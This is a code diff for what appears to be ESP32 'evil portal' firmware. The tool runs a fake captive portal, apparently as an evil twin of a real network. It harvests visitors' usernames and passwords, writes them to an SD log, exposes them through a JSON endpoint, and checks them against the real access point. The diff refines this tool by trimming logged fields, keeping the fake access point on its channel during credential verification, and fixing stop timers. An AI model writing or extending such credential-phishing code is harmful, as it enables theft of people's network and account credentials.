@@ -231,8 +231,8 @@ enum capture_verify_t {
     CAP_VERIFY_ERROR
 };
 typedef struct {
-    char mac[18];
-    char hostname[64];
+    char mac[18];           /* reserved: not populated per-capture by the current plumbing */
+    char hostname[64];      /* reserved: not populated per-capture by the current plumbing */
     char url[256];
     char username[64];
     char password[64];
@@ -496,7 +496,7 @@ static void handle_captive_request(web_req_t *r)
             if (!f) set_error("Could not append to the SD capture log");
             else {
                 fprintf(f, "%lld", (long long)cap.ts);
-                const char *fields[] = {cap.username, cap.password, cap.hostname};
+                const char *fields[] = {cap.username, cap.password};
                 for (const char *field : fields) {
                     fputc(',', f);
                     if (*field == '=' || *field == '+' || *field == '-' || *field == '@') fputc('\'', f);
@@ -870,9 +870,7 @@ static void get_captures(web_req_t *r)
     std::string j = "{\"captures\":[";
     for (size_t i = 0; i < s_captures.size(); i++) {
         if (i) j += ",";
-        j += "{\"mac\":"; web_json_str(j, s_captures[i].mac);
-        j += ",\"hostname\":"; web_json_str(j, s_captures[i].hostname);
-        j += ",\"url\":"; web_json_str(j, s_captures[i].url);
+        j += "{\"url\":"; web_json_str(j, s_captures[i].url);
         j += ",\"username\":"; web_json_str(j, s_captures[i].username);
 
         std::string pwd;
@@ -1234,7 +1232,14 @@ static void finish_verification(void)
 {
     if (!s_verify_running) return;
 #ifdef ARDUINO
-    restore_sta_config(false);
+    if (s_active) {
+        /* The portal is still running: only drop the verification STA link. Do NOT reconnect to the
+         * saved home AP here — AP and STA share one radio, so reconnecting would pull the portal AP
+         * off its (twin) channel. The real STA restore happens in portal_finish(). */
+        WiFi.disconnect(false, false);
+    } else {
+        restore_sta_config(false);
+    }
 #endif
     s_verify_running = false;
     s_verify_cancel = false;
@@ -1406,7 +1411,7 @@ static void setup_log_path(void)
         s_logpath[0] = 0;
         set_error("SD capture log could not be created; captures are memory-only");
     } else {
-        if (ftell(f) == 0) fputs("timestamp,username,password,hostname\n", f);
+        if (ftell(f) == 0) fputs("timestamp,username,password\n", f);
         fclose(f);
     }
     if (s_debug) {
@@ -1525,10 +1530,13 @@ static void evilportal_tick(uint32_t now_ms)
         }
     }
 #endif
-    if (s_auto_base_s > 0) {
+    /* The idle ("base") and active ("extended") stop timers are independent; either one set to 0
+     * means "off". Whichever applies to the current state (traffic or not) stops the portal when
+     * elapsed reaches it. */
+    uint32_t limit = (s_clients > 0 || s_attempts > 0) ? s_auto_extended_s : s_auto_base_s;
+    if (limit > 0) {
         uint32_t elapsed = (uint32_t)(tools_epoch() - s_started);
-        uint32_t limit = (s_clients > 0 || s_attempts > 0) ? s_auto_extended_s : s_auto_base_s;
-        if (limit > 0 && elapsed >= limit) portal_finish();
+        if (elapsed >= limit) portal_finish();
     }
 }
 
